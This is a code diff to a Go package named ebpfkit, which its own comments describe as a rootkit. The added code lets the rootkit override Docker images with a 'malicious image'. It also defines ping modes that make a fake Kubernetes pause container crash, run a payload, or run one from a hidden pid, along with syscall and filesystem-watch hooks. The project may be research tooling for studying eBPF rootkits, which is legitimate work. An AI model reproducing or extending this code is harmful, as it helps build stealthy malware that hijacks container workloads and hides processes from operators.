@@ -19,6 +19,8 @@ package ebpfkit
 // Options contains the parameters
 type Options struct {
 	TargetHTTPServerPort int
+	IngressIfname        string
+	EgressIfname         string
 }
 
 func (o Options) check() error {
@@ -43,6 +45,17 @@ const (
 	PutPipeProgHandler
 	// DelPipeProgHandler is the handler used to delete a piped program
 	DelPipeProgHandler
+	// PutDockerImageHandler is the handler used to send a new Docker image override
+	PutDockerImageHandler
+	// DelDockerImageHandler is the handler used to remove a Docker image override request
+	DelDockerImageHandler
+)
+
+// RawSyscallProg is used to define the tail call key of each syscall
+type RawSyscallProg uint32
+
+const (
+	newfstatat RawSyscallProg = 262
 )
 
 // HTTPAction is used to define the action to take for a given HTTP request
@@ -77,11 +90,70 @@ func NewPipedProgram(prog string) [467]byte {
 	return rep
 }
 
+func NewDockerImage68(image string) [68]byte {
+	rep := [68]byte{}
+	copy(rep[:], image)
+	return rep
+}
+
+type ImageOverrideKey struct {
+	Prefix uint32
+	Image  [68]byte
+}
+
+const (
+	// DockerImageNop is used to indicate that ebpfkit shouldn't change anything for the current image.
+	DockerImageNop uint16 = iota
+	// DockerImageReplace is used to indicate that ebpfkit should replace the old image with the one provided in the
+	// ReplaceWith field.
+	DockerImageReplace
+)
+
+const (
+	// PingNop means that the rootkit will not answer to the ping
+	PingNop uint16 = iota
+	// PingCrash means that the pause container should crash
+	PingCrash
+	// PingRun means that the pause container should behave as the normal k8s pause container, while running its payload
+	PingRun
+	// PingHide means that the pause container should behave as the normal k8s pause container, while running its payload
+	// from a hidden pid
+	PingHide
+)
+
+type ImageOverride struct {
+	// Override defines if eBPFKit should override the image
+	Override uint16
+	// Ping defines what the malicious image should do on startup
+	Ping uint16
+	// Prefix defines the minimum length of the prefix used to query the LPM trie. Use the same value as the key.
+	Prefix uint32
+	// ReplaceWith defines the Docker image to use instead of the one defined in the key.
+	ReplaceWith [64]byte
+}
+
+func NewDockerImage64(image string) [64]byte {
+	rep := [64]byte{}
+	copy(rep[:], image)
+	return rep
+}
+
+type FSWatchKey struct {
+	Flag     uint8
+	Filepath [256]byte
+}
+
+func NewFSWatchFilepath(key string) [256]byte {
+	rep := [256]byte{}
+	copy(rep[:], key)
+	return rep
+}
+
 var (
 	// HealthCheckRequest is the default healthcheck request
 	HealthCheckRequest = NewHTTPDataBuffer("GET /healthcheck HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nHost: localhost:8000")
 	// HealthCheckRequestLen is the length of the default healthcheck request
-	HealthCheckRequestLen = uint32(109)
+	HealthCheckRequestLen = uint32(112)
 )
 
 type HTTPRoute struct {
